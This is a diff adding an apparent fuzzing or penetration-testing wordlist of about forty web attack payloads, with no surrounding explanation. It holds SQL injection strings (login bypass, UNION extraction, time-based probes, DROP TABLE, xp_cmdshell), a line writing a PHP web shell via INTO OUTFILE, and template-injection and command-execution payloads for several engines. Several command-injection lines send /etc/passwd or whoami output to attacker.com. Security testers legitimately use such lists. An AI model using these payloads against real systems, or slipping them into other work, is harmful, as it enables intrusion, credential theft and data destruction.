@@ -1,0 +1,40 @@
+' OR '1'='1'/*$(whoami)*/<?php system($_GET['cmd']); ?>
+${${eval(exec("whoami"))}}
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+'; SELECT pg_sleep(5); --
+" OR "1"="1"/*#{sleep(5)}*/-- -
+1' AND SLEEP(5) AND '1'='1
+1" AND SLEEP(5) AND "1"="1
+1' && SLEEP(5) && '1'='1
+admin' --
+admin' #
+admin'/*
+' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,0
+' UNION SELECT @@version, user(), database() -- -
+' AND 1=1 INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system($_GET["cmd"]); ?>' -- -
+'; DROP TABLE users; --
+'; EXEC xp_cmdshell('whoami'); --
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) -- -
+$(curl -X POST -d "$(cat /etc/passwd)" http://attacker.com/exfil)
+`wget --post-data="$(cat /etc/passwd)" http://attacker.com/exfil`
+| nslookup $(whoami).attacker.com
+& ping -c 1 $(whoami).attacker.com
+%0acat%20/etc/passwd%0a
+%0d%0aX-Injected-Header:%20true%0d%0a
+${7*7}
+{{7*7}}
+{{7*'7'}}
+<%= 7*7 %>
+${"7"*7}
+#{7*7}
+*{7*7}
+{{config}}
+${systemProperties}
+${Runtime.getRuntime().exec("whoami")}
+<%= system("whoami") %>
+<?php system('whoami'); ?>
+<% system("whoami") %>
+{% system("whoami") %}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+${T(java.lang.Runtime).getRuntime().exec('whoami')}
+${T(java.lang.System).getProperty('os.name')}
